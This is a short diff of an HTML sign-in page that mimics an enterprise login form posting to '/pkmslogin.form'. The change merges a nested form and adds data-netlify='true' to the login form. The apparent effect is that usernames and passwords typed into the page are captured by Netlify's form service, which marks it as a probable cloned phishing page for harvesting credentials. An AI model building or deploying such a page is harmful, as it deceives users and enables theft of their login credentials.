@@ -83,9 +83,8 @@ function checkResponse() {
                         <h1 id="signIn_Header" class="mx-4 mt-6 mb-4 text-center">Sign In</h1>
                         <div id="signIn_SubHeader"></div>
                         
-                        <form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" autocomplete="off" action="/pkmslogin.form?token=Unknown" onsubmit="setFedSettings()">
-                            <div class="form-inputs mb-4">
-                                    <form method="POST" data-netlify="true">
+                        <form name="Login" novalidate="" id="cloud-directory-form" class="needs-validation mb-6 px-4 px-xxl-6" method="POST" data-netlify="true" autocomplete="off" action="/pkmslogin.form?token=Unknown" onsubmit="setFedSettings()">
+				<div class="form-inputs mb-4">
 							
 							   <label class="form-label" for="vusername">Username or Email</label>
                                	<input id="vusername" type="text" class="form-control" name="vusername" value="" tabindex="1" data-toggle="tooltip" data-placement="top" title="Please provide user name">
